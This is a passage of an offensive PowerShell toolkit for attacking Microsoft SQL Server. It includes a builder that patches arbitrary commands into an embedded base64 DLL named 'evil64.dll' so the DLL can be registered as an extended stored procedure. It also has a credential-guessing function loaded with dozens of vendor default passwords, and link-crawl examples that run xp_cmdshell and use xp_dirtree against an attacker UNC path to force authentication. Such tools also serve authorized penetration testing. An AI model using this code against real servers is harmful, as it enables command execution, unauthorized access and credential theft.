AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAQAgAAAAIK4orjCuOK5AriivMK84r0CvSK9QrwAAAMABABQAAABYqGCoCKkgqSipeK0A0AEADAAAAKigAAAAQAIADAAAAACgEKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

    # Convert it to a byte array
    [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)

    # This is the string in the DLL template that will need to be replaced
    $BufferString = 'REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!'

    # -----------------------------------------------
    # Setup command
    # -----------------------------------------------

    # Command to injectin into the DLL (if not defined by the user)
    IF(-not($Command))
    {
        $CommandString = 'echo This is a test. > c:\temp\test.txt && REM'
    }
    else
    {
        $CommandString = "$Command && REM"
    }

    # Calculate the length of the BufferString
    $BufferStringLen = $BufferString.Length

    # Calculate the length of the Command
    $CommandStringLen = $CommandString.Length

    # Check if the command is to long to be accepted by cmd.exe used by the system call
    if ($CommandStringLen -gt $BufferStringLen)
    {
        Write-Warning -Message ' Command is too long!'
        Break
    }
    else
    {
        $BuffLenDiff = $BufferStringLen - $CommandStringLen
        $NewBuffer = ' ' * $BuffLenDiff
        $CommandString = "$CommandString && REM $NewBuffer"
    }

    # Convert command string
    $CommandStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($CommandString)

    # Get string value of the DLL file
    $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)

    # Set the offset to 0
    $Index = 0

    # Get the starting offset of the buffer string
    $Index = $S.IndexOf($BufferString)

    if(($Index -eq 0) -and ($Index -ne -1))
    {
        throw("Could not find string $BufferString !")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for command: $Index"
    }

    # Replace target bytes
    for ($i = 0; $i -lt $CommandStringBytes.Length; $i++)
    {
        $DllBytes[$Index+$i] = $CommandStringBytes[$i]
    }

    # -----------------------------------------------
    # Setup proc / dll function export name
    # -----------------------------------------------
    $ProcNameBuffer = 'EVILEVILEVILEVILEVIL'

    # Set default dll name
    IF(-not($ExportName))
    {
        $ExportName = 'xp_evil'
    }

    # Check function name length
    $ProcNameBufferLen = $ProcNameBuffer.Length
    $ExportNameLen = $ExportName.Length
    If ($ProcNameBufferLen -lt $ExportNameLen)
    {
        Write-Warning -Message ' The function name is too long!'
        Break
    }
    else
    {
        $ProcBuffLenDiff = $ProcNameBufferLen - $ExportNameLen
        $ProcNewBuffer = '' * $ProcBuffLenDiff
        #$ExportName = "$ExportName$ProcNewBuffer" # need to write nullbytes
    }

    # Get function name string offset
    $ProcIndex = 0

    # Get string value of the DLL file
    $S2 = [System.Text.Encoding]::ASCII.GetString($DllBytes)

    $ProcIndex = $S2.IndexOf($ProcNameBuffer)

    # Check for offset errors
    if(($ProcIndex -eq 0) -and ($ProcIndex -ne -1))
    {
        throw("Could not find string $ProcNameBuffer!")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for function name: $ProcIndex"
    }

    # Convert function name to bytes
    $ExportNameBytes = ([system.Text.Encoding]::UTF8).GetBytes($ExportName)

    # Replace target bytes
    for ($i = 0; $i -lt $ExportNameBytes.Length; $i++)
    {
        $DllBytes[$ProcIndex+$i] = $ExportNameBytes[$i]
    }

    # Get offset for nulls
    $NullOffset = $ProcIndex+$ExportNameLen
    Write-Verbose -Message " Found buffer offset for buffer: $NullOffset"
    $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer)

    # Replace target bytes
    for ($i = 0; $i -lt $ProcBuffLenDiff; $i++)
    {
        $DllBytes[$NullOffset+$i] = $NullBytes[$i]
    }

    # ------------------------------------
    # Write DLL file to disk
    # ------------------------------------

    IF(-not($OutFile))
    {
        $OutFile = '.\evil64.dll'
    }

    Write-Verbose -Message "Creating DLL $OutFile"
    Write-Verbose -Message " - Exported function name: $ExportName"
    Write-Verbose -Message " - Exported function command: `"$Command`""
    Write-Verbose -Message " - Manual test: rundll32 $OutFile,$ExportName"
    Set-Content -Value $DllBytes -Encoding Byte -Path $OutFile
    Write-Verbose -Message ' - DLL written'

    Write-Verbose -Message ' '
    Write-Verbose -Message 'SQL Server Notes'
    Write-Verbose -Message 'The exported function can be registered as a SQL Server extended stored procedure. Options below:'
    Write-Verbose -Message " - Register xp via local disk: sp_addextendedproc `'$ExportName`', 'c:\temp\myxp.dll'"
    Write-Verbose -Message " - Register xp via UNC path: sp_addextendedproc `'$ExportName`', `'\\servername\pathtofile\myxp.dll`'"
    Write-Verbose -Message " - Unregister xp: sp_dropextendedproc `'$ExportName`'"
}

# ----------------------------------
#  Get-SQLServerLoginDefaultPw
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
Function  Get-SQLServerLoginDefaultPw
{
    <#
            .SYNOPSIS
            Based on the instance name, test if SQL Server is configured with default passwords.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerLoginDefaultPw -Instance SQLServer1\STANDARDDEV2014
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLoginDefaultPw -Verbose
            VERBOSE: SQLServer1\SQLEXPRESS : Confirmed instance match.
            VERBOSE: SQLServer1\SQLEXPRESS : No credential matches were found.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Confirmed instance match.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Confirmed default credentials - test/test
            VERBOSE: SQLServer1 : No instance match found.

            Computer       Instance                       Username Password IsSysadmin
            --------       --------                       -------- -------- --------
            SQLServer1     SQLServer1\STANDARDDEV2014     test     test      No
            .EXAMPLE
            PS C:\> Get-SQLInstanceLDomain | Get-SQLServerLoginDefaultPw -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblResults.Columns.Add('Computer') | Out-Null
        $TblResults.Columns.Add('Instance') | Out-Null
        $TblResults.Columns.Add('Username') | Out-Null
        $TblResults.Columns.Add('Password') | Out-Null 
        $TblResults.Columns.Add('IsSysAdmin') | Out-Null

        # Create table for database of defaults
        $DefaultPasswords = New-Object System.Data.DataTable
        $DefaultPasswords.Columns.Add('Instance') | Out-Null
        $DefaultPasswords.Columns.Add('Username') | Out-Null
        $DefaultPasswords.Columns.Add('Password') | Out-Null        

        # Populate DefaultPasswords data table
        $DefaultPasswords.Rows.Add("ACS","ej","ej") | Out-Null
        $DefaultPasswords.Rows.Add("ACT7","sa","sage") | Out-Null
        $DefaultPasswords.Rows.Add("AOM2","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n#") | out-null
        $DefaultPasswords.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
        $DefaultPasswords.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
        $DefaultPasswords.Rows.Add("BPASERVER9","sa","AutoMateBPA9") | Out-Null
        $DefaultPasswords.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL08","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CounterPoint","sa","CounterPoint8") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
        $DefaultPasswords.Rows.Add("CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!") | Out-Null
        $DefaultPasswords.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("DPM","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("DVTEL","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("ECC","sa","Webgility2011") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
        $DefaultPasswords.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
        $DefaultPasswords.Rows.Add("HDPS","sa","sa") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","hpdss") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("INTRAVET","sa","Webster#1") | Out-Null
        $DefaultPasswords.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
        $DefaultPasswords.Rows.Add("PRISM","sa","SecurityMaster08") | Out-Null
        $DefaultPasswords.Rows.Add("RMSQLDATA","Super","Orange") | out-null
        $DefaultPasswords.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
        $DefaultPasswords.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
        $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
        $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
        $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
        $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
        $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
        $DefaultPasswords.Rows.Add("VSDOTNET","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("VSQL","sa","111") | Out-Null

        $PwCount = $DefaultPasswords | measure | select count -ExpandProperty count
        # Write-Verbose "Loaded $PwCount default passwords."
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
       
        # Grab only the instance name       
        $TargetInstance = $Instance.Split("\")[1]

        # Bypass ports and default instances
        if(-not $TargetInstance){
            Write-Verbose "$Instance : No named instance found."
            return
        }
       
        # Check if instance is in list
        $TblResultsTemp = ""
        $TblResultsTemp = $DefaultPasswords | Where-Object { $_.instance -eq "$TargetInstance"}        

        if($TblResultsTemp){    
            Write-Verbose "$Instance : Confirmed instance match." 
        }else{
            Write-Verbose "$Instance : No instance match found."
            return 
        }        

        # Grab username and password
        $CurrentUsername = $TblResultsTemp.username
        $CurrentPassword = $TblResultsTemp.password

        # Test login
        $LoginTest = Get-SQLServerInfo -Instance $instance -Username $CurrentUsername -Password $CurrentPassword -SuppressVerbose
        if($LoginTest){

            Write-Verbose "$Instance : Confirmed default credentials - $CurrentUsername/$CurrentPassword"

            $SysadminStatus = $LoginTest | select IsSysadmin -ExpandProperty IsSysadmin

            # Append if successful                      
            $TblResults.Rows.Add(
                $ComputerName,
                $Instance,
                $CurrentUsername,
                $CurrentPassword,
                $SysadminStatus
            ) | Out-Null
        }else{
            Write-Verbose "$Instance : No credential matches were found."
        }
    }

    End
    {
        # Return data
        $TblResults
    }
}

Function Get-SQLServerLinkCrawl{
    <#
    .SYNOPSIS
    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links.
    .DESCRIPTION
    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links. The function enumerates database names, versions, and links,
    and then enumerates the MSSQL user and the privileges that the link path has.
    .EXAMPLE
    Get-SQLServerLinkCrawl -Instance "servername\instancename"
    .PARAMETER Username
    SQL Server or domain account to authenticate with.
    .PARAMETER Password
    SQL Server or domain account password to authenticate with.
    .PARAMETER Credential
    Windows credentials.
    .PARAMETER Instance
    SQL Server instance to connection to.
    .PARAMETER DAC
    Dedicated Administrator Connection (DAC).
    .PARAMETER TimeOut
    Connection timeout.
    .PARAMETER Query
    Custom SQL query to run on each server.
    .PARAMETER Export
    Convert collected data to exportable format.
    .Example
    Crawl linked servers and return a list of databases for each one in a readable format.
    Get-SQLServerLinkCrawl -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' | where Instance -ne "Broken Link" |
    foreach-object { Get-SQLQuery -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' -Query (get-SQLServerLinkQuery -Path $_.Path -Sql 'select system_user')}
    .Example
    Crawl linked servers and return a list of databases for each one as datatable objects.
    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases"
    .Example
    Crawl linked servers and return a list of databases for each one. and hide broken links.
    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" | where name -ne "Broken Link" | select name,version,path,links,user,sysadmin,customquery | format-table
    .Example
    Crawl linked servers, execute an OS command using xp_cmdshell, and return the results.
    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'" | format-table
    .Example
    Crawl linked servers, execute xp_dirtree, and return results.  This can also be used to force the SQL Server to authenticate to an attacker using a UNC path.
    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree 'c:\temp'" -Export | format-table
    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree '\\attackerip\file'" -Export | format-table
    .Example
     Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
